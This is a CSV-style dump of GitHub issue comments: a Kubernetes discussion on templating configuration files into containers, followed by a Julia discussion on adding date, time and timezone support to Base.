kubernetes/kubernetes/30716/240846531,30716,"@friend I hear you.  Well, anything I do on this will need to come after CNCF day ... ",,False
kubernetes/kubernetes/30716/240963841,30716,"Definitely plus one to @friend words. This is very important topic (that's why @friend and @friend made PoCs), it definitely should be easy and understandable to end user. I'm pretty sure that assumption that you can store configs in  is valid only in perfect world, but in reality it's not that easy. In my opinion any solution which uses init-containers, custom init scripts, init-containers to do templating feels hacky and requires serious k8s knowledge or pollutes pod/container definition with logic that shouldn't be there. ",,False
kubernetes/kubernetes/30716/240994417,30716,"About initscripts besides ""feeling hacky"" the problem is they lack DRY-ness. You need to specify the data twice. First in the pod definition. Second - in the script. So your deployments become harder to maintain. My proposal Let's add an ability to add config file templates. These templates will be able to consume data from the following sources  Configmaps Secrets Pods  The templates will use syntax based on  package (I believe it is powerful enough for our needs). The template can be  Specified as inline data in the definition file In an external file referred by filename relative to the location of definition file.  The files can be inserted to the pod in two ways  Mounted separately in any place (at least Docker supports single file mounts) Added to DownwardAPI volumes  The ""DownwardAPI"" volume could be renamed if it is confusing to newcomers. Generally however the original DownwardAPI and ConfigMap volumes should become deprecated as much less powerful than templating. What we need The current state of PoC implements a lot for this proposal. What is still missing is  Single file mounts Templates in separate files Secret data consumption Consuming several configmaps directly (you can use configmap links however)  Questions  Are there any objects beside Pods, Secrets and ConfigMaps we want to be source of data? Do we need any tools in our templates beside simple interpolation of values and text/template tools?  I would like to call @friend and @friend to pay attention to this thread as well. The next two weeks I will login irregularly, but please comment. ",,False
kubernetes/kubernetes/30716/241006118,30716,"Oh, also @friend - please comment if these requirements are enough for us. ",,False
kubernetes/kubernetes/30716/241016463,30716,"@friend Looks good, there is one of the examples we will be happy to see covered with templates. ",,False
kubernetes/kubernetes/30716/241051092,30716,"@friend plus one BTW, one of the examples I'm dealing with is PostgreSQL, where the config files need to go into a specific directory, which also contains files we want to inherit from the upstream image.  Postgres also has specific permissions requirements for those files.  So I think that's a good test case for any scheme; if it can handle Postgres, it can probably cover any service. ",,False
kubernetes/kubernetes/30716/241052625,30716,"Some answers  Are there any objects beside Pods, Secrets and ConfigMaps we want to be source of data?  If by ""pods"" you mean ""everything currently available via the core Downward API"" then those three things cover all of the use cases I have.  Do we need any tools in our templates beside simple interpolation of values and text/template tools?  I do not for my use cases. ",,False
kubernetes/kubernetes/30716/241213777,30716,"So I have some thoughts here based on the ""datacenter as a computer"" and ""k8s as a cloud OS"" abstractions. I think the fundamental primitive that we're lacking is higher-level environment variables. So what I think would be most powerful here is the abstract concept of an  that provides variables that can be interpolated for probably any sort of resource. This would be exactly analagous to the way  and the way environment variables are usable/overridable at the separate levels of a standalone OS. So, what I would propose as an alternative would be an `Environment ♠yaml ",,False
kubernetes/kubernetes/30716/241221649,30716,@friend I'm not seeing how this lets me drop a Pod IP into a config file in the container? ,,False
kubernetes/kubernetes/30716/241224326,30716,"Ah, sorry, I missed the example of dropping in the pod IP. I've never really had that particular issue, since the pod IP is already known to the process (that is,  or  will return the pod IP). Still, I think there's a growing problem in k8s of ""kind"" sprawl, so if we're proposing a templating solution, I'd rather see something generically applicable for any existing object, however it makes sense for those objects (much like a bash environment abstraction). That said, if you wanted to add dynamic data (e.g. downward API), the  list has always allowed  that supports dynamic data. The problem with my suggested approach if that was allowed, though, is that you now have the potential for cycles if  is used. This is a problem with the previously-proposed solution as well; that or deadlocks if two Templates refer to one anothers' products, so either way some thought ought to be put into that case, in which case I think it's likely applicable for both solutions. ",,False
kubernetes/kubernetes/30716/241233801,30716,"On further thought, a  construct could be shorthand for a command that gets run in an init container which is basically just the kube* tools (most importantly kubectl) set up for in-cluster commands. This would be quite powerful and fit with the general that one can also run any OS command inside $() in a shell. ",,False
kubernetes/kubernetes/30716/241593299,30716,@friend huh.  where is that documented? ,,False
kubernetes/kubernetes/30716/241599050,30716,"@friend I thought we had doc on this, but I couldn't find any after a brief search (we'll fix that); design doc is ",,False
kubernetes/kubernetes/30716/241600628,30716,"I swear this is documented.  Please tell me it is documented... On Mon, Aug 22, 2016 at 616 PM, Paul Morie notifications@friend.com wrote ",,False
kubernetes/kubernetes/30716/241609773,30716,@friend This is pretty much what my internal monologue is saying right now... ,,False
kubernetes/kubernetes/30716/241610308,30716,I see it referenced in a couple places  API Reference ConfigMap docs  ...but it looks like there is no good user-facing doc for this.  I'll write some ASAP. ,,False
kubernetes/kubernetes/30716/241610448,30716,I swear I remember writing doc for this... ,,False
kubernetes/kubernetes/30716/242968136,30716,"Regarding improvements for environment variables I believe this is out of scope for this proposal. This one is specifically to allow DRY and simple generation of configuration files. Especially for some legacy apps, that would otherwise need startup scripts. Regarding the choice of templating language The text/templates module has more than enough power for our purpose. It is easily extensible besides. It also is a builtin and is quite intuitive, so we lower the entry level for new programmers of this feature. If someone believes we could need some more power, we could expose some entry point to allow plugging template filters (I don't think that would ever be necessary, but it can be implemented) ",,False
kubernetes/kubernetes/30716/242994555,30716,"Given the previous discussions in the template proposal, we are unlikely to use Go templates as a first class mechanism.  I highly recommend reading that proposal and the associated issue for context - that will impact how any proposal in this space would be constrained. ",,False
kubernetes/kubernetes/30716/243244723,30716,... choice of templating syntax still seems like the least important thing about this discussion.  Especially since we might not do templates at all. ,,False
kubernetes/kubernetes/30716/243828024,30716,@friend Env. substitution does not have a user-facing doc AFAIK. See #15244 re. how disorganized our pod/container docs are. Please reach out to sig-docs for advice about where to put this content. ,,False
kubernetes/kubernetes/30716/243829166,30716,See also #11492 ,,False
kubernetes/kubernetes/30716/243830237,30716,Ref #2068 ,,False
kubernetes/kubernetes/30716/243830491,30716,@friend Links to examples of entrypoint.sh scripts? ,,False
kubernetes/kubernetes/30716/243890520,30716,Note that we've also talked about creating a library of sidecars ,,False
kubernetes/kubernetes/30716/243891394,30716,"We don't allow env vars to be changed today, but I could imagine supporting that in the future, and we do allow ConfigMap changes, so I think initContainers won't work and though I'm a fan of container volumes (#831), I think that shares the same problem. Image volumes (also #831) would allow config files to be packaged separately, however, as mentioned above. ",,False
kubernetes/kubernetes/30716/243891457,30716,cc @friend ,,False
kubernetes/kubernetes/30716/243892117,30716,"Maybe @friend has suggestions, also. ",,False
kubernetes/kubernetes/30716/243892754,30716,"I must be losing my touch. I was sure that @friend previously proposed an inline volume source, but I can't find it. That said, I like @friend's command-line alternative. ",,False
kubernetes/kubernetes/30716/243916237,30716,The template proposal was #18215 and the doc is here  implementation issue is #23896 ,,False
kubernetes/kubernetes/30716/243932899,30716,"@friend so that's a different kind of template, one for the service definition itself, rather than a template for files to be pushed into the running containers. ",,False
kubernetes/kubernetes/30716/243935509,30716,"@friend Some examples  Patroni Postgres    Note how pretty much all that entrypoint script does is create a config file out of ENV variables.  And yet, it's vulnerable to quoting issues, disrupts signal processing, etc.  Official Postgres Image for Docker  one does several things, but I'd like to call out this horrible line  Redmine, official image  (worst case, really)  we can't get Docker to change the official images because they won't have configfile support.  But we could make it not necessary for our users to go to such lengths. ",,False
kubernetes/kubernetes/30716/243951799,30716,"@friend i question how many people want config map changes inline (in practice) vs deployment controlled.  config map changes inline are ""hooray, now your application is broken all at once"" so I think they are reserved for sophisticated users. On Wed, Aug 31, 2016 at 743 PM, Josh Berkus notifications@friend.com wrote ",,False
kubernetes/kubernetes/30716/243957682,30716,@friend I agree about inline configmaps. I was just looking for past discussions about related topics. ,,False
kubernetes/kubernetes/30716/244079393,30716,"Working through the comments in this thread I would strongly suggest we not build a configuration management tool into Kubernetes. Once we go this route there will be no turning back, we will reach a point of owning a subset of functionally that every configuration management tool does. Today the request is for dynamic configuration with the ability to pull data from any source. Tomorrow it will be nested configuration, permissions, merging, and pushing data back into Kubernetes to be consumed by other pods and containers. Dynamic configuration can be accomplished with init-containers and sidecars, what we lack is great documentation and working examples of how to do it using existing tools such as confd, consul-template, or ansible. Is there any chance the community can spend some time working with what we have and writing up the results after several rounds of experimenting? The reason all of this seems hacky is because it is. The fact that some people want to extract configuration and templates from container images and merge them with user defined configuration and templates will be the source of pain to come. One idea I've experimented with is running something like consul-template or confd in a controller that would render templates based on external data (secrets, configmaps, consul, etc) into other secrets and/or configmaps that are consumed by pods. This would get us 90% there in terms of dynamic configuration. The last mile stuff is a little harder. Once your app needs pod level information, then the user is forced to run the configuration tool as an init-container or sidecar. The main challenge is combining configuration and templates that ship inside of a container image with the user defined configuration and templates stored in Kubernetes. I think we should ask the community to strongly consider avoiding this problem entirely. Since my days at Puppet Labs, its always been considered a good idea to separate application code and configuration. In the case of Kubernetes that would mean storing all configuration files and templates outside of container images and ensuring that each configuration file is referenced from a Kubernetes configmap or secret, which may have been generated from an external configuration controller running in the cluster. This keeps Kubernetes easy to reason about. For the last mile stuff like ""I need my Pod IP"", then users will need to rerun a templating tool from an init container and refresh the config from a sidecar. We have the same problem for all dynamic content including short lived secrets such as the ones you get from HashiCorps vault project. The problem here is that a very small subset of applications really want Pod level details, which feels like a real one off to me. I rather not build a general solution for what feels like a one off. ",,False
kubernetes/kubernetes/30716/244122360,30716,"@friend ""The problem here is that a very small subset of applications really want Pod level details, which feels like a real one off to me."" Given that I started down this particular quest based on something you said, this seems like a contradictory attitude.  Do you want people to get rid of ""init scripts for hipsters"", or not?  If you really do, the answer is to make doing things the right way easier, rather than much harder. ",,False
kubernetes/kubernetes/30716/244130184,30716,"BTW, I'm not saying that a template object is the answer.  I'm just saying that we need an answer which isn't ""implement this long complicated toolchain involving several different kinds of objects"". ",,False
kubernetes/kubernetes/30716/244185782,30716,"Inline volumes discussed in  Thu, Sep 1, 2016 at 913 AM, Josh Berkus notifications@friend.com wrote ",,False
kubernetes/kubernetes/30716/244471244,30716,"@friend Those examples are helpful, thanks. ",,False
kubernetes/kubernetes/30716/244951884,30716,"@friend  If the idea of using any templating language above simple substitution is rejected, will it be acceptable to allow for plugins (containerised?) that would receive the template and JSON data and perform the template rendering? ",,False
kubernetes/kubernetes/30716/244958194,30716,"Yes, although that's effectively what an init container is (a plugin to pod initialization).  If the usability of doing that is hard, we can improve it. On Tue, Sep 6, 2016 at 936 AM, Szymon Pyżalski notifications@friend.com wrote ",,False
kubernetes/kubernetes/30716/245837476,30716,Rendered configuration files proposal (v 2.0) Configuration file object The configuration file object specifies one configuration file that can be mounted in a container. They will be specified per pod. Either inlined in pod definition or defined separately and linked in a pod. Example configuration file definition Data sources Data sources are objects that contain data that can be used in this config file. The data sources can be  configmaps secrets environment variables  also a pod is a data source that exposes several values like  PodIP Labels Name  Every data source has a name. The pod is automatically added with reserved name . The environment variables as mapping under reserved name Config Config can be any mapping. The specification for config depends on the renderer. Renderer A renderer is a container that is creating the actual content for the file. Thanks to the renderer all the templating (or other) logic is moved from the k8s core that can be unopinionated on how the rendering should take place. The renderer when called is passed  The config (as it is) The data from all the sources as a mapping {sourceName data}  The renderer should produce the config file content and exit. Summary The above proposal allows for  Declarative and DRY creation of configuration files Easy reuse of data in configmaps Simple and reusable implementation of templating that is however separated from the core Usage of basic pod facts and interpolating them in configuration files Future implementation of data propagation  ,,False
kubernetes/kubernetes/30716/245955343,30716,"On Wed, Aug 31, 2016 at 636 PM, Clayton Coleman notifications@friend.com wrote I use it as a small-file push mechanism ",,False
kubernetes/kubernetes/30716/245958399,30716,"How is this better than adding a template-renderer container that reads the template from a flag or file and renders into a volume? On Fri, Sep 9, 2016 at 1213 AM, Szymon Pyżalski notifications@friend.com wrote ",,False
kubernetes/kubernetes/30716/246266124,30716,@friend it seems to be simpler and more generic. Everything is in the config file. The mount logic is in core. So we don't need any hacky init container logic. ,,False
kubernetes/kubernetes/30716/246433600,30716,"That is not a very compelling reason.  The cost of things in core is 10x the cost of things out of core. On Mon, Sep 12, 2016 at 1212 AM, Szymon Pyżalski notifications@friend.com wrote ",,False
kubernetes/kubernetes/30716/246448946,30716,"Tim, you are the very definition of sophisticated user here )​ ",,False
kubernetes/kubernetes/30716/246449968,30716,"I think there is probably some missing semantic sugar around pods of this form.  One might be directly inlining small files via a volume type, which avoids entrypoint hackiness.  We'd have to strongly control size though. I look at the vitess examples and think that is a reasonable ""higher end"" configuration size for a pod ( one where an inline file would improve the organization of the code. ",,False
kubernetes/kubernetes/30716/246454393,30716,"I was all into inline volumes, but ConfigMap is more powerful and already exists. On Mon, Sep 12, 2016 at 1146 AM, Clayton Coleman notifications@friend.com wrote ",,False
kubernetes/kubernetes/30716/246465704,30716,"Wow, @friend, thanks for the vitess example. I think this section is an excellent example of one of the emerging patterns that makes practical use of kubernetes harder (and less portable) than it needs to be. To boil down my opinions concisely, I think there are two patterns emerging that are used solely for the case of handling (respectively) cluster-level variables and runtime variables  Explicitly pre-processing of manifests via shell script Explicitly post-processing of Kube objects via init containers/scripts  I think these two use cases are pervasive enough that they warrant some syntactic sugar and integration into the tool/environment to eliminate both types of wrapper scripts (wrapping kubectl and wrapping your containerized process). To address @friend's concerns about ending up writing a CMDB, I think that kube crossed that bridge long ago when ConfigMaps and Secrets were added and allowed those to be mapped to environment variables or files. We're storing our config in our cluster/namespaces already, but restricted to confusing (while powerful) ways of consuming that data (wrappers/init containers). So, that said, can we at least agree that for the sake of user experience, it would be beneficial to have an integrated, easy-to-understand and easy-to-use, way of getting their cluster config and metadata into their kube objects? Not that it can't be solved dozens of other ways, which is clearly true, but that in terms of usability for all sorts of users, can't we do better? ",,False
kubernetes/kubernetes/30716/246466337,30716,"ConfigMap is not update safe (without extra care today) and can't be delivered easily as an atomic unit.  I agree there are downsides to inline volumes, but I do think small ones would be a net usability win. ",,False
kubernetes/kubernetes/30716/246466540,30716,"The section you pasted is really just a PetSet - when this example was written it wasn't possible, but it's really the same concept (and was taken into account during the petset core design). ",,False
kubernetes/kubernetes/30716/246510836,30716,"On Mon, Sep 12, 2016 at 1240 PM, Clayton Coleman notifications@friend.com wrote I don't understand this.  It's not atomic wrt all pods getting updates at the same time, but it's not as if they see a half-cooked state of the CM.  The only upside I see to an inline volume is the inline-ness of it. ",,False
kubernetes/kubernetes/30716/246524826,30716,"You create config.  App gets deployed.  You're happy.  Someone updates the config.  A node is evacuated elsewhere in the cluster and one of your pods picks up the new config.  Everything fails.  You try to figure out what the old values of config are.  You cry. The sharp edges of that ""surprise, your app doesn't work"" are what I'm most concerned with.  We tell everyone to use configmaps, and a non-trivial percentage of people don't reason about the interaction of config map with an administrator evacuating a node, and a non-trivial percentage of applications will fail and fail hard with mismatched config.  So trying to find places where the path of least surprise is exactly how you expect the platform to work, even if you don't think about it, and then you can go use it in sophisticated and awesome ways later.  If configmaps defaulted to readonly after creation, and you had to go think about allowing them to mutate, that would be one example of safety.  Or if the configmap automatically preserved old versions of itself that you could roll back to. The advantage of inline configmap is that it cannot be out of sync with the cluster and can be propagated through a deployment in a trivially correct way. On Mon, Sep 12, 2016 at 608 PM, Tim Hockin notifications@friend.com wrote ",,False
kubernetes/kubernetes/30716/246527030,30716,Can we split off the discussion of live updating configmaps after deployment into a separate proposal?  It's really a completely different feature. ,,False
kubernetes/kubernetes/30716/246528914,30716,"It's relevant with respect to inline configmaps templating and making it easier to do config templating inline with the minimal syntax.  An inline config map avoids bash squirreliness and makes a wider range of init container templating engine options feasible.  So I don't think it's separate. On Mon, Sep 12, 2016 at 725 PM, Josh Berkus notifications@friend.com wrote ",,False
kubernetes/kubernetes/30716/246529125,30716,"Don't think it's totally separate.  We already have an issue for the live updating. On Mon, Sep 12, 2016 at 736 PM, Clayton Coleman ccoleman@friend.com wrote ",,False
kubernetes/kubernetes/30716/246536577,30716,"It does seem to be at least tangentially related, though I think the topic of ""what happens if the config map changes"" is still orthogonal to ""can templated config maps change if upstream data sources change?"" The latter seems very relevant. IMO the inline config map vs external config map would also be irrelevant given a good templating solution. If the templating solution is complete, then either option should reasonably accept template placeholders. Also to address another of @friend 's concerns I think we'd all agree with that (if I'm understanding you correctly). And I think the intent is still that in any case, given k8s objects with template expressions, the final product is k8s objects ready for consumption, e.g. mounting into the volume as a config file, resulting in a container image that does not need to be tailored beforehand to k8s. ",,False
kubernetes/kubernetes/30716/246551184,30716,"I think it's important to note that we already have solutions in the ecosystem for complex multi resource templating that we have previously said belong above the core platform - specifically Deployment Manager (now the server component of Helm), local templating + apply, Ansible, and others.  To Kelsey's point, we are trying not to build one of those solutions in the core, because they belong as a properly layered component on top.  Half of the discussion is how to build those (which others are doing) and half has to be on how we make those tools able to do less by having good primitives. I don't think any template language we include will make those tools easier to use, because they will now have multiple languages to apply.  The argument I usually hear is trying to make Kube fit better into Ansible, existing config mgmt flows, HEAT, Deployment Manager, etc.  Mixing template languages is really painful, so it doesn't seem like a clear win if we're meeting the community where they are. For instance, we don't want to put a template language under apply - we want it to be above (an input to apply), so that people can lean on apply to avoid having to do local patch merging. As another example, iterative config application (inputs to template change -&gt; template generates new output -&gt; deployment triggered) requires at least minimal outside orchestration, especially when multiple components are involved.  We aren't eager to make that orchestration a first class concept in kube because it's likely no one orchestrator is a suitable solution for all use cases. A template evaluation environment that is even partially or strongly turing complete has to run in a pod, just by its nature.  Deployment Manager does this with expandybird - as something like what is proposed here grows more flexible it would also have to be run in a pod.  Given that the output of that pod is a transformed local file, it's really hard to justify a completely separate implementation that isn't an init container (at least right now) because the init container is already isolated and under the user's control and doesn't have to implement a separate API / transport channel. The short term things already discussed in this thread have a lot of individual merit  Better doc and examples around existing init container use here (and a really strong minimal example that tries to be as ""api like"" as possible) Inline config maps Prototyping (or working with Helm or the AppController guys) an orchestrator that can copy config map changes for deployments (and can by definition also go run templates) to show your desired flow Projection of volumes into pods more effectively (@friend spawned an issue on this) A better way to catalog / inject helpful sidecar patterns into containers (kubectl add-sidecar deployment/foo --from=mylibrary-of-sidecars)  Did I miss any? On Mon, Sep 12, 2016 at 823 PM, Andrew Stuart notifications@friend.com wrote ",,False
kubernetes/kubernetes/30716/246573528,30716,"On Mon, Sep 12, 2016 at 413 PM, Clayton Coleman notifications@friend.com wrote I assume you mean ""without bouncing the pod, and the app does not pick it up dynamically"" Someone laid a land mine and was sad when they stepped on it.  I 100% agree land mines are bad, but this is not the first such case. ReplicationController and ReplicaSet have the same problems.  Docker image tags being mutable have the same problems. Conversely, if you had defined it as an inline volume, RC and RS would fail the same way, and Deployment would try to roll out and fail right away. If you don't want a time bomb, you HAVE to actuate changes right away, regardless of whether that's an inline or not. Is ""I updated a config map"" really more confusing than ""I updated my replication controller"" ?  In both cases, it is part of your ""app DAG"" and you updated it. Mismatched config is a fact of life, no matter what - whether that is a rolling update or an accidental land mine. This is why we generally tell people not to update configmaps, but create a new one, update your deployment, and do an rolling update. I don't buy it - you can lay almost the same traps with an inline, if you're not careful.  I'm not AGAINST an inline volume, per se, I just don't see the value that justifies the extra complexity.  I'm willing to be swayed by ""but UX"", but this, in the end, just a TINY piece of what this bug is aboyut. ",,False
kubernetes/kubernetes/30716/250018486,30716,"@friend, all I'm inclined at this point to close this in favor of a proposal of ""make init containers easier to use"", which seems like the way to go.  However, there have been a LOT of other proposals on this issue which aren't mine; is it OK to just close it nevertheless? ",,False
kubernetes/kubernetes/30716/250020547,30716,"@friend I don't think so that init container is the way to go, proposal submitted by @friend looks nice. And I think it's worth solving it a bit at configmap level. ",,False
kubernetes/kubernetes/30716/250237095,30716,"I wonder if resource templating as a whole would be worth discussing on the community call ( cc @friend ) (Or, is there an appropriate SIG?). For me, there are already too many in-motion proposals and implementations (the helm tool and this templating issue spring to mind) to keep track of. Even if it's just a ""yes, we are going with 23896 for the foreseeable future"" acknowledgement, it'd be helpful in my mind for some sort of consensus and communication about the project's direction on this matter. ",,False
kubernetes/kubernetes/30716/250239499,30716,"                                                                                  There are some plans to discuss that on sig-apps.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        From Andrew StuartSent środa, 28 września 2016 1927To kubernetes/kubernetesReply To kubernetes/kubernetesCc Jędrzej Nowak; CommentSubject Re [kubernetes/kubernetes] Proposal Template object for in-container configuration files (#30716)I wonder if resource templating as a whole would be worth discussing on the community call ( cc @friend ) (Or, is there an appropriate SIG?). For me, there are already too many in-motion proposals and implementations (the helm tool and this templating issue spring to mind) to keep track of. Even if it's just a ""yes, we are going with 23896 for the foreseeable future"" acknowledgement, it'd be helpful in my mind for some sort of consensus and communication about the project's direction on this matter.  —You are receiving this because you commented.Reply to this email directly, view it on GitHub, or mute the thread. {""api_version""""1.0"",""publisher""{""api_key""""05dde50f1d1a384dd78767c55493e4bb"",""name""""GitHub""},""entity""{""external_key""""github/kubernetes/kubernetes"",""title""""kubernetes/kubernetes"",""subtitle""""GitHub repository"",""main_image_url"""" in GitHub"",""url"""" in #30716 I wonder if resource templating as a whole would be worth discussing on the community call ( cc @friend ) (Or, is there an appropriate SIG?). For me, there are already too many in-motion proposals and implementations (the helm tool and this templating issue spring to mind) to keep track of. Even if it's just a \""yes, we are going with 23896 for the foreseeable future\"" acknowledgement, it'd be helpful in my mind for some sort of consensus and communication about the project's direction on this matter.""}],""action""{""name""""View Issue"",""url""""",,False
kubernetes/kubernetes/30716/251065255,30716,@friend @friend @friend @friend @friend could we organize a short discussion in sig-apps about that? ,,False
kubernetes/kubernetes/30716/251184808,30716,"I don't usually attend sig-apps, please let me know if/when this is on the agenda On Mon, Oct 3, 2016 at 239 AM, Jędrzej Nowak notifications@friend.com wrote ",,False
kubernetes/kubernetes/30716/251185659,30716,"@friend Ditto @friend, and also that nobody's paying me to do k8s work (yet), so my regular work will have to take precedence, but I can definitely try to attend, depending on the time. ",,False
kubernetes/kubernetes/30716/251188503,30716,"Also, you may want to comment on #23896 and/or kubernetes/features#35 if there's going to be a generalized discussion as they will almost certainly have either made progress already or have opinions and suggestions of their own to add. ",,False
kubernetes/kubernetes/30716/292595985,30716,"@friend Is there any chance that there is more documentation beyond the examples you mentioned in  ? I desperately want to share the available syntax with colleagues, but cannot be certain how much is implemented (and in which version). ",,False
kubernetes/kubernetes/30716/341531834,30716,Any decision has been made on this? ,,False
kubernetes/kubernetes/30716/341588872,30716,No templates. ,,False
kubernetes/kubernetes/30716/342539710,30716,Is there a recommended way to inject a configuration file with interpolated variables/secret into a container at the moment? ,,False
kubernetes/kubernetes/30716/342559053,30716,"@friend Please ask on kubernetes-users and/or stackoverflow, or try to build a consensus within SIG Apps. ",,False
kubernetes/kubernetes/30716/348259591,30716,"So , as of now im assuming no we dont / can't encrypt data in configmaps. ",,False
julia/JuliaLang/3524/15941511,3524,"Is it possible to merge Calendar into Base, possibly after some bikeshedding? We had so much discussion about time series support last year, then Calendar became the de facto time series tool without ever entering Base. ",,False
julia/JuliaLang/3524/19928322,3524,"plus one If it's ironed out enough, I think time series support is a very natural expectation of Base material. ",,False
julia/JuliaLang/3524/19929795,3524,"I really wish that this didn't entail depending on ICU, but we probably should. ",,False
julia/JuliaLang/3524/19932411,3524,"Please ping me when this lands, as I should probably update build recipes and debian package requirements to include . ",,False
julia/JuliaLang/3524/19939087,3524,How much functionality can we retain without ICU? ,,False
julia/JuliaLang/3524/19939982,3524,"I've started digging into it a little bit, and @friend can speak to it more, but currently  is very dependent on ICU. Excluding ICU would basically require rewriting everything, but I'm also inclined to think we could get the majority of the functionality in a very Julian way without ICU and also without it being too difficult to implement (ICU has pretty good documentation of everything). Would definitely be a fun project if we decided to go that way. ",,False
julia/JuliaLang/3524/19946754,3524,"@friend It depends on what you mean by ""majority of the functionality"". Implementing zulu time in pure julia would be easy. Adding timezone support, however, would be quite difficult. As i see it, proper timezone handling is Calendar's raison d'etre. ",,False
julia/JuliaLang/3524/19957493,3524,"@friend agree with @friend. Zulu time is implemented in pure Julia in  (the api is different from Calendar, but that would be a trivial change) Adding timezone support is the missing piece. I had some julia code to parse the olson database, but never got to implementing the conversions. On top of that, one needs leap second support. Another large piece of functionality that ICU provides is date formatting/parsing. All of which is certainly doable, but is a large chunk of work. ",,False
julia/JuliaLang/3524/19958431,3524,"ICU is big, but it is easy to get on Linux and is included in OS X. I believe it also works on Windows. Even if we can reimplement much of what we need in Windows, it will be quite a chore to support. I am in favour of using ICU and bringing Calendar into Base. Over time, we could reduce our dependence on ICU, if circumstances demand. ",,False
julia/JuliaLang/3524/19966321,3524,"My vote would be to start out with a simpler featureset in pure Julia (a la SimpleDate.jl) with a clean API that can be expanded over time and exclude the ICU dependence. Starting out with a more SQL-like support with Date, Time, DateTime types, lubridate-style arithmetic, duration, period, and interval support, and IO support with parsing/formatting is a solid foundation that provides a lot of basic functionality. As for leap seconds, we could take ICU's approach and ignore them ) (basically leave it to the operating system to figure out). Timezone support is definitely a bigger chunk of work to do manually, but there are simple ways to include basic functionality (as @friend mentioned) and marking it as a future feature for full support I think is reasonable. ",,False
julia/JuliaLang/3524/19974242,3524,@friend  happy to give you commit access to SimpleDate if you want to run with that codebase. ,,False
julia/JuliaLang/3524/19975028,3524,"In general, I like @friend's gung ho attitude. My major worry is that we can't start using times without leap seconds and then introduce them later unless we tell people that the date time support is a draft at best. ",,False
julia/JuliaLang/3524/20010466,3524,"Thanks @friend, I've enjoyed going over your code today and I'm taking a stab at adding features while trying to follow Calendar.jl's conceptual framework to get a working julia Calendar/Timezone implementation. The thing with leapseconds is there really isn't a lot of consensus on how to handle them at all. Most languages/applications (including ICU) have taken the approach that they're not going to worry about it and let it be an OS problem. Implementation can be tricky, but we can take a stab at it if we deem it important enough. I found blog post here with a good walkthrough of considerations, and also came across a slightly hacky way that Google deals with leapseconds. The problem with a lot of ""solutions"" (hacks mainly) is that they're all pretty much clever ways to trick servers into dealing with an extra second every once in a while and not really a formal API or anything. One thing I thought of was doing a simple cache of year seconds/milliseconds and basing our date parsing off of them. That would allow us to easily manually add seconds as needed, calculate accurate durations/intervals, and also has the added benefit of giving us much faster date parsing. Anyway, I'll plug away a little more and see if I can't push something for review. ",,False
julia/JuliaLang/3524/20196189,3524,"I suspect that ignoring leap seconds might be best since 1) everyone else does it, making compatibility difficult if julia doesn't 2) if people do care about leap seconds, they would probably just use TAI (or have their own special method for dealing with it all) I think the easiest and least confusing solution would be to define a TAI timezone (or a seperate TAI datetime type), and define a method for converting between that and UTC by adding/subtracting the appropriate number of seconds that way, if you want the length of an interval for between  and  (stored in UTC), you could do something like ",,False
julia/JuliaLang/3524/20529428,3524,"Ok, I just created new repo with a bunch of stuff I've been working on the last 2 weeks. Basically it ended up being a much larger beast than I anticipated, but that most of you were probably aware of. ) I think it's a really good start though for Date, Periods, TimeZone, and DateTime support in pure Julia.  Here's the repo  main influences for the code are as follows  @friend SimpleDate.jl package @friend Calendar.jl package the R  package Java's Joda-time (which is considered a gold standard across languages even and will soon be merged into core Java)  High-level framework/concepts  a  abstract type to represent a certain calendar's way of date calculations (== chronologies in Joda-time) a  abstract type which is subtyped by all identified zones in the Olson tz database (see ) bits types that represent certain relative/absolute durations of time, including , , , , , and  a  immutable with fields for year, month, and day and is parameterized by a certain  (the  is used by default). This is our ""low-precision"" type that doesn't have to worry about timezones and leap seconds and is easier to reason about in terms of period arithmetic. Similar to a partial datetime or LocalDate in Joda, or a simple Date type in many DBMS. This is very fast to work with doing ranges and arithmetic. a  type that can be used to create frequences given start/period/stop inputs. I think a pure  type could represent Intervals in lubridate/Joda where just a start/stop are given (used with arithmetic, not generating frequencies at all) a 64-bit  bits type that is parameterized by a certain  as well as a . It's value represents the number of Rata Die seconds (seconds since 0000-01-01T000000), similar in concept to a Rata Die day number (see code for more date algorithm comments). Since Unix time's epoch is 62135596860 Rata Die seconds, it's trivial to convert Unix timestamps to  types. Using the current default  though, leap seconds are included (try , so wrapping  in  will give you a DateTime 25 seconds or so in the future. (We could correct this with the  function though to give the true current time that someone sees on the clock).  Potentially useful additions  I mentioned a  type; having a  type would map Intervals in lubridate/Joda; this also open up sub-Second possibilities (having a start  instant and noting the attoseconds from that instant); this stems from a lengthy discussion I found in the forums last year I think a  immutable as 's analogue (field-based with Hour, Minute, Second) would be potentially useful as well I would really love to support Temporal Expressions a la  in Ruby link  This is definitely a first draft, and I'm positive there are holes to be plugged and lots of refinement needed. I would really appreciate any questions, critiques, discussion to push this forward. Sources SimpleDate.jl -  -  -  -  -  Algorithms -  Group Discussion -  convo pull request - ",,False
julia/JuliaLang/3524/20559613,3524,"Thanks @friend , this is great. A couple of quick comments while I have more of a play with this  The loading of  seems dependent on the  of the Julia process. May this should be developed as a package intially, and loads made relative to  I assume you have a script to generate the timezone.csv when the Olson db is updated?  This currently seems about two orders of magnitude slower than  for simple data arithmetic.  What is the precision of the  . I personally think that its is fine if very high precision time usage needs specialised libraries, but others may disagree.   ",,False
julia/JuliaLang/3524/20559898,3524,"@friend  I've actually pushed a fix for loading , so let me know if you're still seeing a problem there. I'm actually unsatisfied with how the timezone data is handled in general and this was really just a ""get it working first"" kind of solution. I'd love to brainstorm some more ideas of how to be efficient here. Yeah, there's a script to generate the dataset All of the  stuff is definitely slower right now, particularly if you're using non-UTC timezones. Unacceptably slow really. If you're using the lower precision  type though, it should be faster from my initial benchmarks. The  precision is 64-bits with time measured in seconds, so the max date we can show is . This seems well beyond anything anyone should need for timestamps. I agree that for greater precision, an add-on package could provide even more functionality. The discussion here is what spurred my comment about having a possible  64-bit type that could represent a second^10*-p for higher precision intervals. From the discussion, it seems this was following NumPy's approach, but simpler because we could provide one parameterized type as opposed to NumPy's 26 or so new types they introduced for each power of 10. I guess I just am not familiar with actual use-cases enough to know how to best implement something like this or how best to work with this kind of type. Maybe someone who has had experience or is familiar with sub-second timing needs can comment a little more if this is something Julia should provide out of the box or is something better left to a package. I know @friend was involved a lot in that conversation.  ",,False
